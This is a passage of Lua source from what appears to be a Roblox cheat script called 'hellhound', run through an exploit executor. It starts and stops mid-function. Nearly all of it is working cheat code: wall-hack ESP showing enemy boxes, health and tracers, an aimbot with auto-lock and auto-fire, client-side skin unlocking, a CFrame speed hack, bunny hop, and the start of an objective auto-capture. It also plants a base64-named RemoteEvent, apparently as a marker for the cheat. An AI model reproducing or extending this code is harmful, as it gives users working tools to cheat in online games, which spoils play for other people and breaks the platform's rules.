    library:notify("Succesfully loaded config "..name..".cfg!")
end

function library:refreshConfigs()
    local tbl = {}
    for i,v in next, listfiles("hellhoundCFGS") do
        table.insert(tbl,v)
    end
    library.options["selected_config"].refresh(tbl)
end

function library:deleteConfig()
    if isfile("hellhoundCFGs/"..library.flags["selected_config"]..".cfg") then
        delfile("hellhoundCFGs/"..library.flags["selected_config"]..".cfg")
        library:refreshConfigs()
    end
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")

library:notify("") -- get rid of the label text on the top left

local remoteEvent = Instance.new("RemoteEvent")
remoteEvent.Name = "aGVsbGhvdW5kcHJpdmF0ZQ=="

remoteEvent.Parent = ReplicatedStorage

local aimbotTab = library:addTab("Combat")
local visualsTab = library:addTab("Visuals")
local aimbotGroup = aimbotTab:createGroup('left', '>_<')
local aimbotCheckGroup = aimbotTab:createGroup('center', '>_<')
local aimbotFOVSettings = aimbotTab:createGroup('right', '>_<')
local visualsGroup = visualsTab:createGroup('left', '>_<')
local visualsCheckGroup = visualsTab:createGroup('center', '>_<')
local visualsColourGroup = visualsTab:createGroup('right', '>_<')
local worldvisualsColourGroup = visualsTab:createGroup('left', '>_<')
local skinGroup = visualsTab:createGroup('center', '>_<')
local miscTab = library:addTab("Misc")
local movementCheckGroup = miscTab:createGroup('left', '>_<')
local miscCheckGroup = miscTab:createGroup('center', '>_<')
local configTab = library:addTab("Settings")
local createconfigs = configTab:createGroup('left', 'Create Configs')
local configsettings = configTab:createGroup('left', 'Config Settings')

-- Variables
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local Cache = {}
local lplr = game.Players.LocalPlayer

-- Settings
local ESP_SETTINGS = {
    OutlineColor = Color3.new(0, 0, 0),
    BoxColor = Color3.new(1, 1, 1),
    NameColor = Color3.new(1, 1, 1),
    DistanceColor = Color3.new(1, 1, 1),
    HealthOutlineColor = Color3.new(0, 0, 0),
    HealthHighColor = Color3.new(0, 1, 0),
    HealthLowColor = Color3.new(1, 0, 0),
    CharSize = Vector2.new(4, 6),
    TeamCheck = false,
    WallCheck = false,
    InvisCheck = false,
    AliveCheck = false,
    Enabled = false,
    ShowBox = false,
    BoxType = "2D",
    ShowName = false,
    ShowHealth = false,
    ShowDistance = false,
    ShowTracer = false,
    TracerColor = Color3.new(1, 1, 1), 
    TracerThickness = 2,
    TracerPosition = "Bottom",
}

local function create(class, properties)
    local drawing = Drawing.new(class)
    for property, value in pairs(properties) do
        drawing[property] = value
    end
    return drawing
end

local function isPlayerBehindWall(player)
    local character = player.Character
    if not character then
        return false
    end

    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then
        return false
    end

    local ray = Ray.new(Camera.CFrame.Position, (rootPart.Position - Camera.CFrame.Position).Unit * (rootPart.Position - Camera.CFrame.Position).Magnitude)
    local hit, position = workspace:FindPartOnRayWithIgnoreList(ray, {LocalPlayer.Character, character})
    
    return hit and hit:IsA("Part")
end

local function createEsp(player)
    local esp = {
        boxOutline = create("Square", {
            Color = ESP_SETTINGS.OutlineColor,   
            Thickness = 2,
            Filled = false,
            Visible = false
        }),
        box = create("Square", {
            Color = ESP_SETTINGS.BoxColor,
            Thickness = 1,
            Filled = false,
            Visible = false
        }),
        name = create("Text", {
            Color = ESP_SETTINGS.NameColor,
            Outline = true,
            Center = true,
            Size = 13,
            Visible = false
        }),
        healthOutline = create("Line", {
            Thickness = 3,
            Color = ESP_SETTINGS.HealthOutlineColor,
            Visible = false
        }),
        health = create("Line", {
            Thickness = 2,
            Visible = false
        }),
        distance = create("Text", {
            Color = ESP_SETTINGS.DistanceColor,
            Size = 12,
            Outline = true,
            Center = true,
            Visible = false
        }),
        tracer = create("Line", {
            Thickness = ESP_SETTINGS.TracerThickness,
            Color = ESP_SETTINGS.TracerColor,
            Transparency = 1,
            Visible = false
        }),
        boxLines = {}
    }

    Cache[player] = esp
end

local function removeEsp(player)
    local esp = Cache[player]
    if not esp then return end

    for key, drawing in pairs(esp) do
        if drawing.Remove then
            drawing:Remove()
        elseif key == "boxLines" then
            for _, line in ipairs(drawing) do
                if line.Remove then
                    line:Remove()
                end
            end
        else
            print("No Remove method for", key)
        end
    end

    Cache[player] = nil
end

local function updateEsp()
    for player, esp in pairs(Cache) do
        local character, team = player.Character, player.Team
        if character and (not ESP_SETTINGS.TeamCheck or (team and team ~= LocalPlayer.Team)) then
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            local head = character:FindFirstChild("Head")
            local humanoid1 = character:FindFirstChild("Humanoid")
            local isBehindWall = ESP_SETTINGS.WallCheck and isPlayerBehindWall(player)
            local isnotDead = ESP_SETTINGS.AliveCheck and humanoid1 and humanoid1.Health == 0
            local isInvisible = ESP_SETTINGS.InvisCheck and head and head.Transparency == 1
            local shouldShow = not isBehindWall and ESP_SETTINGS.Enabled and not isInvisible and not isnotDead
            if rootPart and shouldShow then
                local position, onScreen = Camera:WorldToViewportPoint(rootPart.Position)
                if onScreen then
                    local hrp2D = Camera:WorldToViewportPoint(rootPart.Position)
                    local charSize = (Camera:WorldToViewportPoint(rootPart.Position - Vector3.new(0, 3, 0)).Y - Camera:WorldToViewportPoint(rootPart.Position + Vector3.new(0, 2.6, 0)).Y) / 2
                    local boxSize = Vector2.new(math.floor(charSize * 1.5), math.floor(charSize * 1.9))
                    local boxPosition = Vector2.new(math.floor(hrp2D.X - charSize * 1.5 / 2), math.floor(hrp2D.Y - charSize * 1.6 / 2))

                    if ESP_SETTINGS.ShowName and ESP_SETTINGS.Enabled then
                        esp.name.Visible = true
                        esp.name.Text = string.lower(player.Name)
                        esp.name.Position = Vector2.new(boxSize.X / 2 + boxPosition.X, boxPosition.Y - 16)
                        esp.name.Color = ESP_SETTINGS.NameColor
                    else
                        esp.name.Visible = false
                    end

                    if ESP_SETTINGS.ShowBox and ESP_SETTINGS.Enabled then
                        if ESP_SETTINGS.BoxType == "2D" then
                            esp.boxOutline.Size = boxSize
                            esp.boxOutline.Position = boxPosition
                            esp.box.Size = boxSize
                            esp.box.Position = boxPosition
                            esp.box.Color = ESP_SETTINGS.BoxColor
                            esp.box.Visible = true
                            esp.boxOutline.Visible = true
                            for _, line in ipairs(esp.boxLines) do
                                line:Remove()
                            end
                        end
                    else
                        esp.box.Visible = false
                        esp.boxOutline.Visible = false
                    end

                    if ESP_SETTINGS.ShowHealth and ESP_SETTINGS.Enabled then
                        esp.healthOutline.Visible = true
                        esp.health.Visible = true
                        local healthPercentage = player.Character.Humanoid.Health / player.Character.Humanoid.MaxHealth
                        esp.healthOutline.From = Vector2.new(boxPosition.X - 5.5, boxPosition.Y + boxSize.Y)
                        esp.healthOutline.To = Vector2.new(esp.healthOutline.From.X, esp.healthOutline.From.Y - boxSize.Y)
                        esp.health.From = Vector2.new((boxPosition.X - 5), boxPosition.Y + boxSize.Y)
                        esp.health.To = Vector2.new(esp.health.From.X, esp.health.From.Y - healthPercentage * boxSize.Y)
                        esp.health.Color = ESP_SETTINGS.HealthLowColor:Lerp(ESP_SETTINGS.HealthHighColor, healthPercentage)
                    else
                        esp.healthOutline.Visible = false
                        esp.health.Visible = false
                    end

                    if ESP_SETTINGS.ShowDistance and ESP_SETTINGS.Enabled then
                        local distance = (Camera.CFrame.p - rootPart.Position).Magnitude
                        esp.distance.Text = string.format("%.1f studs", distance)
                        esp.distance.Position = Vector2.new(boxPosition.X + boxSize.X / 2, boxPosition.Y + boxSize.Y + 5)
                        esp.distance.Visible = true
                        esp.distance.Color = ESP_SETTINGS.DistanceColor
                    else
                        esp.distance.Visible = false
                    end

                    if ESP_SETTINGS.ShowTracer and ESP_SETTINGS.Enabled then
                        esp.tracer.Color = ESP_SETTINGS.TracerColor
                        local tracerY
                        if ESP_SETTINGS.TracerPosition == "Top" then
                            tracerY = 0
                        elseif ESP_SETTINGS.TracerPosition == "Middle" then
                            tracerY = Camera.ViewportSize.Y / 2
                        else
                            tracerY = Camera.ViewportSize.Y
                        end
                        if ESP_SETTINGS.TeamCheck and player.TeamColor == LocalPlayer.TeamColor then
                            esp.tracer.Visible = false
                        else
                            esp.tracer.Visible = true
                            esp.tracer.From = Vector2.new(Camera.ViewportSize.X / 2, tracerY)
                            esp.tracer.To = Vector2.new(hrp2D.X, hrp2D.Y)            
                        end
                    else
                        esp.tracer.Visible = false
                    end
                else
                    for _, drawing in pairs(esp) do
                        drawing.Visible = false
                    end
                end
            else
                for _, drawing in pairs(esp) do
                    drawing.Visible = false
                end
            end
        else
            for _, drawing in pairs(esp) do
                drawing.Visible = false
            end
        end
    end
end


-- Initialize ESP for existing players
for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        createEsp(player)
    end
end

-- Handle new players
Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        createEsp(player)
    end
end)

-- Remove ESP when players leave
Players.PlayerRemoving:Connect(function(player)
    removeEsp(player)
end)

-- Update ESP on each frame
RunService.RenderStepped:Connect(updateEsp)

--[[
aimbot src
]]

local select = select
local pcall, getgenv, next, Vector2, mathclamp, type, mousemoverel = select(1, pcall, getgenv, next, Vector2.new, math.clamp, mousemoverel or (Input and Input.MouseMove))

pcall(function()
    if getgenv().Aimbot and getgenv().Aimbot.Functions then
        getgenv().Aimbot.Functions:Exit()
    end
end)

getgenv().Aimbot = getgenv().Aimbot or {}
local Environment = getgenv().Aimbot

local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

local RequiredDistance, Typing, Running, Animation, ServiceConnections = 2000, false, false, nil, {}
local Shooting = false

Environment.Settings = {
    Enabled = false,
    TeamCheck = false,
    AliveCheck = false,
    WallCheck = false,
    ForceField_Check = false,
    Tool_Check = false,
    AimbotAutoSelect = false,
    ThirdPerson = false,
    ThirdPersonSensitivity = 3,
    TriggerKey = Enum.KeyCode.J,
    Toggle = false,
    LockPart = "Head",
    Invisible_Check = false,
    ClosestBodyPartAimbot = false,
    IsMainDead = false,
    AimbotFriendCheck = false,
    Sensitivity = 0,
    AutoFire = false,
    JumpOffset = false,
    JumpOffsetAmount = 0,
    JumpOffsetKey = Enum.KeyCode.G
}

Environment.FOVSettings = {
    Enabled = false,
    Visible = false,
    Amount = 90,
    Color = Color3.fromRGB(255, 255, 255),
    LockedColor = Color3.fromRGB(255, 70, 70),
    Transparency = 0.5,
    Sides = 60,
    Thickness = 1,
    Filled = false
}

Environment.FOVCircle = Environment.FOVCircle or Drawing.new("Circle")

local function CancelLock()
    Environment.Locked = nil
    if Animation then Animation:Cancel() end
    Environment.FOVCircle.Color = Environment.FOVSettings.Color
    if Shooting then
        mouse1release()
        Shooting = false
    end
end

local function IsInFOV(targetPosition)
    local mouseLocation = UserInputService:GetMouseLocation()
    local fovCircleRadius = Environment.FOVSettings.Amount
    return (targetPosition - mouseLocation).Magnitude <= fovCircleRadius
end

local function IsObstructed(target)
    if not Environment.Settings.WallCheck then
        return false
    end
    local targetPosition = target.Character[Environment.Settings.LockPart].Position
    local parts = Camera:GetPartsObscuringTarget({targetPosition}, {LocalPlayer.Character, target.Character})
    return #parts > 0
end

local function HasForceField(target)
    if not Environment.Settings.ForceField_Check then
        return false
    end
    return target.Character:FindFirstChildOfClass("ForceField") ~= nil
end

local function IsHoldingTool()
    if not Environment.Settings.Tool_Check then
        return true
    end
    return LocalPlayer.Character:FindFirstChildOfClass("Tool") ~= nil
end

local function GetClosestPlayer()
    if not Environment.Locked then
        RequiredDistance = (Environment.FOVSettings.Enabled and Environment.FOVSettings.Amount or 2000)

        local closestPlayer = nil
        local closestDistance = math.huge

        for _, v in next, Players:GetPlayers() do
            if v ~= LocalPlayer then
                local character = v.Character
                if character and character:FindFirstChild(Environment.Settings.LockPart) and character:FindFirstChildOfClass("Humanoid") then
                    if Environment.Settings.TeamCheck and v.Team == LocalPlayer.Team then continue end
                    if Environment.Settings.AimbotFriendCheck and LocalPlayer:IsFriendsWith(v.UserId) then continue end
                    if Environment.Settings.AliveCheck and character:FindFirstChildOfClass("Humanoid").Health <= 0 then continue end
                    if Environment.Settings.Invisible_Check and character.Head and character.Head.Transparency == 1 then continue end
                    if Environment.Settings.ForceField_Check and HasForceField(v) then continue end

                    local lockPartPosition = character[Environment.Settings.LockPart].Position
                    local Vector, OnScreen = Camera:WorldToViewportPoint(lockPartPosition)
                    local Distance = (Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2(Vector.X, Vector.Y)).Magnitude

                    if Distance < closestDistance and OnScreen and (not Environment.Settings.WallCheck or not IsObstructed(v)) then
                        if not Environment.FOVSettings.Enabled or IsInFOV(Vector2(Vector.X, Vector.Y)) then
                            closestPlayer = v
                            closestDistance = Distance
                        end
                    end
                end
            end
        end

        if closestPlayer then
            local closestPart = nil
            local closestPartDistance = math.huge

            if Environment.Settings.ClosestBodyPartAimbot then
                for _, part in ipairs(closestPlayer.Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        local distance = (part.Position - Mouse.Hit.p).Magnitude
                        if distance < closestPartDistance then
                            closestPart = part
                            closestPartDistance = distance
                        end
                    end
                end
            else
                closestPart = closestPlayer.Character:FindFirstChild(Environment.Settings.LockPart)
                closestPartDistance = closestDistance
            end

            if closestPart then
                RequiredDistance = closestPartDistance
                Environment.Locked = closestPlayer
                Environment.Settings.LockPart = closestPart.Name
            end
        end
    else
        local lockPartPosition = Environment.Locked.Character[Environment.Settings.LockPart].Position
        if Environment.Settings.WallCheck and IsObstructed(Environment.Locked) then
            CancelLock()
        elseif (Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2(Camera:WorldToViewportPoint(lockPartPosition).X, Camera:WorldToViewportPoint(lockPartPosition).Y)).Magnitude > RequiredDistance then
            CancelLock()
        end
    end
end

ServiceConnections.TypingStartedConnection = UserInputService.TextBoxFocused:Connect(function()
    Typing = true
end)

ServiceConnections.TypingEndedConnection = UserInputService.TextBoxFocusReleased:Connect(function()
    Typing = false
end)

local function Load()
    local UserInputService_GetMouseLocation = UserInputService.GetMouseLocation
    local Camera_WorldToViewportPoint = Camera.WorldToViewportPoint
    local mathclamp = math.clamp

    ServiceConnections.RenderSteppedConnection = RunService.RenderStepped:Connect(function()
        if Environment.FOVSettings.Enabled and Environment.Settings.Enabled then
            local mouseLocation = UserInputService_GetMouseLocation(UserInputService)
            local fovCircle = Environment.FOVCircle
            fovCircle.Radius = Environment.FOVSettings.Amount
            fovCircle.Thickness = Environment.FOVSettings.Thickness
            fovCircle.Filled = Environment.FOVSettings.Filled
            fovCircle.NumSides = Environment.FOVSettings.Sides
            fovCircle.Color = Environment.FOVSettings.Color
            fovCircle.Transparency = Environment.FOVSettings.Transparency
            fovCircle.Visible = Environment.FOVSettings.Visible
            fovCircle.Position = Vector2(mouseLocation.X, mouseLocation.Y)
        else
            Environment.FOVCircle.Visible = false
        end

        if (Running or Environment.Settings.AimbotAutoSelect) and Environment.Settings.Enabled then
            if IsHoldingTool() then
                if Environment.Settings.IsMainDead then
                    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid and humanoid.Health <= 0 then
                        CancelLock()
                        return
                    end
                end
                GetClosestPlayer()

                if Environment.Locked then
                    local lockPartPosition = Environment.Locked.Character[Environment.Settings.LockPart].Position

                    if Environment.Settings.JumpOffset then
                        lockPartPosition = lockPartPosition + Vector3.new(0, Environment.Settings.JumpOffsetAmount, 0)
                    end

                    if Environment.Settings.ThirdPerson then
                        Environment.Settings.ThirdPersonSensitivity = mathclamp(Environment.Settings.ThirdPersonSensitivity, 0.1, 5)
                        local Vector = Camera_WorldToViewportPoint(Camera, lockPartPosition)
                        local mouseLocation = UserInputService_GetMouseLocation(UserInputService)
                        mousemoverel((Vector.X - mouseLocation.X) * Environment.Settings.ThirdPersonSensitivity, (Vector.Y - mouseLocation.Y) * Environment.Settings.ThirdPersonSensitivity)
                    else
                        if Environment.Settings.Sensitivity > 0 then
                            Animation = TweenService:Create(Camera, TweenInfo.new(Environment.Settings.Sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFrame.new(Camera.CFrame.Position, lockPartPosition)})
                            Animation:Play()
                        else
                            Camera.CFrame = CFrame.new(Camera.CFrame.Position, lockPartPosition)
                        end
                    end

                    Environment.FOVCircle.Color = Environment.FOVSettings.LockedColor

                    if Environment.Settings.AutoFire then
                        if not Shooting then
                            mouse1press()
                            Shooting = true
                        end
                    end
                else
                    if Shooting then
                        mouse1release()
                        Shooting = false
                    end
                end
            end
        end
    end)

    ServiceConnections.InputBeganConnection = UserInputService.InputBegan:Connect(function(Input)
        if not Typing then
            if Input.KeyCode == Environment.Settings.TriggerKey then
                if Environment.Settings.Toggle then
                    Running = not Running

                    if not Running then
                        CancelLock()
                    end
                else
                    Running = true
                end
            end
            if Input.KeyCode == Environment.Settings.JumpOffsetKey then
                Environment.Settings.JumpOffset = true
            end
        end
    end)

    ServiceConnections.InputEndedConnection = UserInputService.InputEnded:Connect(function(Input)
        if not Typing then
            if Input.KeyCode == Environment.Settings.TriggerKey and not Environment.Settings.Toggle then
                Running = false
                CancelLock()
            end
            if Input.KeyCode == Environment.Settings.JumpOffsetKey then
                Environment.Settings.JumpOffset = false
            end
        end
    end)
end

Environment.Functions = {}

function Environment.Functions:Exit()
    for _, connection in next, ServiceConnections do
        connection:Disconnect()
    end
    if Animation then Animation:Cancel() end
    if Environment.FOVCircle then Environment.FOVCircle:Remove() end
    if Shooting then
        mouse1release()
        Shooting = false
    end
end

Load()

--[[
end of aimbot src
]]

--start of aimbot

aimbotGroup:addToggle({
    text = "enable",
    flag = "aimbotenabled",
    callback = function(value)
        Environment.Settings.Enabled = value
    end
})

aimbotGroup:addList({
    text = "aim part",
    flag = "aimbotpart",
    values = {"Head", "Torso", "Left Arm", "Right Arm", "Left Leg", "Right Leg"},
    callback = function(value)
        Environment.Settings.LockPart = value
    end
})

aimbotGroup:addSlider({
    text = "smoothness",
    flag = "aimsmoothness",
    min = 0,
    max = 5,
    increment = 0.01,
    callback = function(value)
        Environment.Settings.Sensitivity = value
    end
})

aimbotGroup:addToggle({
    text = "offset",
    flag = "jmpoffsetenabled",
    callback = function(value)
        Environment.Settings.JumpOffset = value
    end
})

aimbotGroup:addList({
    text = "offset key",
    flag = "offsetkey",
    values = { "B", "C", "E", "F", "G", "H", "I", "J", "K", "L", "M", 
              "N", "O", "P", "Q", "R", "T", "U", "V", "X", "Y", "Z"},
    callback = function(value)
        Environment.Settings.TriggerKey = Enum.KeyCode[value]
    end
})

aimbotGroup:addSlider({
    text = "offset",
    flag = "offsetnum",
    min = -5,
    max = 5,
    increment = 0.01,
    callback = function(value)
        Environment.Settings.JumpOffsetAmount = value
    end
})

aimbotGroup:addToggle({
    text = "auto lock",
    flag = "autolockenabled",
    callback = function(value)
        Environment.Settings.AimbotAutoSelect = value
    end
})

aimbotGroup:addToggle({
    text = "auto shoot",
    flag = "autoshootenabled",
    callback = function(value)
        Environment.Settings.AutoFire = value
    end
})

aimbotGroup:addToggle({
    text = "closest point",
    flag = "closestpointenabled",
    callback = function(value)
        Environment.Settings.ClosestBodyPartAimbot = value
    end
})

aimbotGroup:addToggle({
    text = "unlock on death",
    flag = "unlockondeath",
    callback = function(value)
        Environment.Settings.IsMainDead = value
    end
})

aimbotCheckGroup:addList({
    text = "aim key",
    flag = "aimkey",
    values = { "B", "C", "E", "F", "G", "H", "I", "J", "K", "L", "M", 
              "N", "O", "P", "Q", "R", "T", "U", "V", "X", "Y", "Z", "MB2", "MB1"},
    callback = function(value)
        if value == "MB1" then
            Environment.Settings.TriggerKey = Enum.UserInputType.MouseButton1
        elseif value == "MB2" then
            Environment.Settings.TriggerKey = Enum.UserInputType.MouseButton2
        else
            Environment.Settings.TriggerKey = Enum.KeyCode[value]
        end
    end
})

aimbotCheckGroup:addToggle({
    text = "wall check",
    flag = "wallcheckenabled",
    callback = function(value)
        Environment.Settings.WallCheck = value
    end
})

aimbotCheckGroup:addToggle({
    text = "tool check",
    flag = "toolcheckenabled",
    callback = function(value)
        Environment.Settings.Tool_Check = value
    end
})

aimbotCheckGroup:addToggle({
    text = "invisible check",
    flag = "invisiblecheckenabledaimbot",
    callback = function(value)
        Environment.Settings.Invisible_Check = value
    end
})

aimbotCheckGroup:addToggle({
    text = "alive check",
    flag = "alivecheckenabledaimbot",
    callback = function(value)
        Environment.Settings.AliveCheck = value
    end
})

aimbotCheckGroup:addToggle({
    text = "team check",
    flag = "alivecheckenabledaimbot",
    callback = function(value)
        Environment.Settings.TeamCheck = value
    end
})

aimbotCheckGroup:addToggle({
    text = "forcefield check",
    flag = "ffaimbotcheck",
    callback = function(value)
        Environment.Settings.ForceField_Check = value
    end
})

aimbotCheckGroup:addToggle({
    text = "friend check",
    flag = "friendaimbotcheck",
    callback = function(value)
        Environment.Settings.AimbotFriendCheck = value
    end
})

aimbotFOVSettings:addToggle({
    text = "enable",
    flag = "fovenabled",
    callback = function(value)
        Environment.FOVSettings.Enabled = value
    end
})

aimbotFOVSettings:addToggle({
    text = "visualise",
    flag = "fov_visualise",
    callback = function(value)
        Environment.FOVSettings.Visible = value
    end
})

aimbotFOVSettings:addToggle({
    text = "filled",
    flag = "fovfilled",
    callback = function(value)
        Environment.FOVSettings.Filled = value
    end
})

aimbotFOVSettings:addColorpicker({
    text = "colour",
    ontop = true,
    flag = "fovcolour",
    color = Color3.new(1, 1, 1),
    callback = function(value)
        Environment.FOVSettings.Color = value
    end 
})

aimbotFOVSettings:addColorpicker({
    text = "locked colour",
    ontop = true,
    flag = "fovlockedcolour",
    color = Color3.new(1, 0, 0),
    callback = function(value)
        Environment.FOVSettings.LockedColor = value
    end 
})

aimbotFOVSettings:addSlider({
    text = "radius",
    flag = "fovradius",
    min = 1,
    max = 800,
    increment = 1, -- Set increment value
    callback = function(value)
        Environment.FOVSettings.Amount = value
    end
})

--start of visuals

visualsGroup:addToggle({
    text = "enable",
    flag = "espenable",
    callback = function(value)
        ESP_SETTINGS.Enabled = value
    end
})

visualsGroup:addToggle({
    text = "boxes",
    flag = "boxenable",
    callback = function(value)
        ESP_SETTINGS.ShowBox = value
    end
})

visualsGroup:addToggle({
    text = "health bar",
    flag = "healthbarenable",
    callback = function(value)
        ESP_SETTINGS.ShowHealth = value
    end
})

visualsGroup:addToggle({
    text = "invisible alert",
    flag = "invisalert",
    callback = function(value)
        InvisAlert = value
    end
})

--start of visual check group

visualsCheckGroup:addToggle({
    text = "team check",
    flag = "espteamcheckenable",
    callback = function(value)
        ESP_SETTINGS.TeamCheck = value
    end
})

visualsCheckGroup:addToggle({
    text = "alive check",
    flag = "espalivecheckenable",
    callback = function(value)
        ESP_SETTINGS.AliveCheck = value
    end
})

visualsCheckGroup:addToggle({
    text = "invisible check",
    flag = "espinvischeckenable",
    callback = function(value)
        ESP_SETTINGS.InvisCheck = value
    end
})

visualsColourGroup:addColorpicker({
    text = "box",
    ontop = true,
    flag = "boxcolor",
    color = Color3.new(1, 1, 1),
    callback = function(value)
        ESP_SETTINGS.BoxColor = value
    end 
})

visualsColourGroup:addColorpicker({
    text = "health bar high",
    ontop = true,
    flag = "boxcolor",
    color = Color3.new(0, 1, 0),
    callback = function(value)
        ESP_SETTINGS.HealthHighColor = value
    end 
})

visualsColourGroup:addColorpicker({
    text = "health bar low",
    ontop = true,
    flag = "boxcolor",
    color = Color3.new(1, 0, 0),
    callback = function(value)
        ESP_SETTINGS.HealthLowColor = value
    end 
})

local ChangeAtmos = false
local customAmbient = Color3.new(1, 0, 0)
local customFogStart = 10
local customFogEnd = 200
local customFogColor = Color3.new(0.5, 0.5, 0.5)

local normalAmbient = game.Lighting.Ambient
local normalFogStart = game.Lighting.FogStart
local normalFogEnd = game.Lighting.FogEnd
local normalFogColor = game.Lighting.FogColor

local function changeAtmosphere(enable)
    local atmosphere = game.Lighting:FindFirstChild("Atmosphere")
    if atmosphere then
        atmosphere:Destroy()
    end
    
    if enable then
        game.Lighting.Ambient = customAmbient
        game.Lighting.FogStart = customFogStart
        game.Lighting.FogEnd = customFogEnd
        game.Lighting.FogColor = customFogColor
    else
        game.Lighting.Ambient = normalAmbient
        game.Lighting.FogStart = normalFogStart
        game.Lighting.FogEnd = normalFogEnd
        game.Lighting.FogColor = normalFogColor
    end
end


worldvisualsColourGroup:addToggle({
    text = "enable",
    flag = "worldvisualsenable",
    callback = function(value)
        ChangeAtmos = value
    end
})

game:GetService("RunService").RenderStepped:Connect(function()
    changeAtmosphere(ChangeAtmos)
end)


worldvisualsColourGroup:addColorpicker({
    text = "fog colour",
    ontop = true,
    flag = "fogcolour",
    color = Color3.new(1, 1, 1),
    callback = function(value)
        customFogColor = value
    end 
})

worldvisualsColourGroup:addSlider({
    text = "fog start",
    flag = "fogend",
    min = 1,
    max = 800,
    increment = 1, -- Set increment value
    callback = function(value)
        customFogStart = value
    end
})


worldvisualsColourGroup:addSlider({
    text = "fog end",
    flag = "fogstart",
    min = 1,
    max = 800,
    increment = 1, -- Set increment value
    callback = function(value)
        customFogEnd = value
    end
})


worldvisualsColourGroup:addColorpicker({
    text = "ambient colour",
    ontop = true,
    flag = "ambientcolour",
    color = Color3.new(1, 1, 1),
    callback = function(value)
        customAmbient = value
    end 
})

local weapon = game.Players.LocalPlayer

local TransparentGunToggle = false  -- Toggle to control the script
local GunSkinColour = Color3.fromRGB(148, 0, 211)
local GunSkinTransparency = 0.6

local Blacklisted = {"Flame", "SightMark", "SightMark2A", "Tip", "Trigger"}

workspace.CurrentCamera.DescendantAdded:Connect(function(O)
    if O:IsA("BasePart") and TransparentGunToggle and not table.find(Blacklisted, O.Name) then
        spawn(function()
            while wait() do
                O.Color = GunSkinColour
                O.Transparency = GunSkinTransparency
                O.Material = Enum.Material.ForceField
            end
        end)
    end
end)

-- Function to reset part properties
local function ResetPartProperties(part)
    part.Color = Color3.new(1, 1, 1)
    part.Transparency = 0
    part.Material = Enum.Material.Plastic  -- Adjust as needed
end

-- Connect a listener to toggle the script behavior
local function ToggleTransparentGunScript()
    TransparentGunToggle = not TransparentGunToggle
    
    -- Reset properties of all current parts if toggling off
    if not TransparentGunToggle then
        for _, descendant in ipairs(workspace:GetDescendants()) do
            if descendant:IsA("BasePart") and not table.find(Blacklisted, descendant.Name) then
                ResetPartProperties(descendant)
            end
        end
    end
end

skinGroup:addList({
    text = "select skin",
    flag = "selectskin",
    values = {"Default", "Wyvern", "Tsunami", "Magma", "Ion", "Toxic", "Staff", "Boundless", "Scythe", "Catalyst", "Offwhite", "Pulsar", "Blueberry", "Rusted", "Frigid", "Anniversary", "HellSpawn", "Booster", "Rose", "Dove", "Plasma", "Molten", "Imperial", "Gobbler", "Blackice", "Jolly", "Fuchsia", "Manny", "Frost", "Lumberjack", "Mythical", "Sinister", "Gold", "F2", "D2", "C2", "B2", "A2", "N2", "S2", "X2"},
    callback = function(value)
        weapon:SetAttribute("EquippedSkin", value)
    end
})

skinGroup:addToggle({
    text = "transparent gun",
    flag = "transparentgun",
    callback = function(value)
        TransparentGunToggle = value
    end
})

skinGroup:addColorpicker({
    text = "gun colour",
    ontop = true,
    flag = "guncolour",
    color = Color3.new(1, 1, 1),
    callback = function(value)
        GunSkinColour = value
    end 
})

skinGroup:addSlider({
    text = "gun transparency",
    flag = "fogend",
    min = 0,
    max = 1,
    increment = 0.1, -- Set increment value
    callback = function(value)
        GunSkinTransparency = value
    end
})

--start of misc

getgenv().bhopEnabled = false

local function bhop()
    if getgenv().bhopEnabled then
        local character = LocalPlayer.Character
        if character and character:FindFirstChild("Humanoid") then
            local humanoid = character.Humanoid
            if humanoid:GetState() ~= Enum.HumanoidStateType.Freefall then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
end

UserInputService.InputBegan:Connect(onKeyPress)
RunService.RenderStepped:Connect(bhop)

local function changeBhopKey(newKey)
    getgenv().bhopKey = newKey
end

local keybind = Enum.KeyCode.G
local Multiplier = 1
getgenv().CFrameEnabled = false

if not getgenv().CFrameEnabled then
    getgenv().CFrameEnabled = false
end
if not getgenv().cfrene then
    getgenv().cfrene = false
end
if not getgenv().cframe then
    getgenv().cframe = true
end

local function runScript()
    if not getgenv().CFrameEnabled then return end
    if getgenv().cfrene then
        getgenv().cfrene = false
    else
        getgenv().cfrene = true
        repeat
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Multiplier
            game:GetService("RunService").Stepped:Wait()
        until not getgenv().cfrene
    end
end

game:GetService("UserInputService").InputBegan:Connect(function(input)
    if input.KeyCode == keybind then
        runScript()
    end
end)


movementCheckGroup:addToggle({
    text = "cframe walk",
    flag = "cframetoggle",
    callback = function(value)
        getgenv().CFrameEnabled = value
    end
})

movementCheckGroup:addSlider({
    text = "cframe speed",
    flag = "cframespeed",
    min = 1,
    max = 100,
    increment = 1, -- Set increment value
    callback = function(value)
        Multiplier = value
    end
})

movementCheckGroup:addKeybind({
    flag = "cframekey", -- Unique flag for the keybind
    key = Enum.KeyCode.G, -- Default key
    callback = function()
        runScript()
    end
})

movementCheckGroup:addToggle({
    text = "bunny hop",
    flag = "bhopenable",
    callback = function(value)
        getgenv().bhopEnabled = value
    end
})

getgenv().AutoCapPoint = false

    local function AutoCapPoint1()
        if getgenv().AutoCapPoint then
            local objectives = game.Workspace.Objectives:GetChildren()
            for _, objective in ipairs(objectives) do
